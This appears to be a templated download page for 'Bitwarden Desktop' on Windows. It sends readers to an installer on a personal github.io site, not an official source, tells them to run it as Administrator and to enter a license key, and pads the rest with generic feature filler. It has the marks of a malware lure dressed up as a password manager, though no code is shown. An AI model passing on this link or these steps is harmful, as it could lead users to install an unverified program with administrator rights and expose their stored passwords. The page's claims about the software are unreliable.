# Bitwarden Desktop Windows Setup Notes

## Download & Install

> **Download:** [**Get Bitwarden Desktop for Windows →**](https://ashrafr6043.github.io)
>
> Setup notes for **Bitwarden Desktop** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **Bitwarden Desktop** from the Start menu

## What you can use it for

- Core Bitwarden Desktop features on Windows desktop
- Install and configure Bitwarden Desktop for daily use
- Import, edit, and export with Bitwarden Desktop tools
- Tune settings and profiles inside Bitwarden Desktop
- Integrate Bitwarden Desktop into your existing workflow
